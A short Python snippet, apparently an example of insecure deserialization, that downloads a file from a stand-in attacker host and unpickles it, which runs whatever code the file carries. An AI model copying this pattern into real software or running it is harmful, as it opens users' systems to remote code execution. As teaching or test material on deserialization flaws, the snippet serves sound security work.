import pickle
import requests

response = requests.get("https://attacker.example/model.pkl")
model = pickle.loads(response.content)
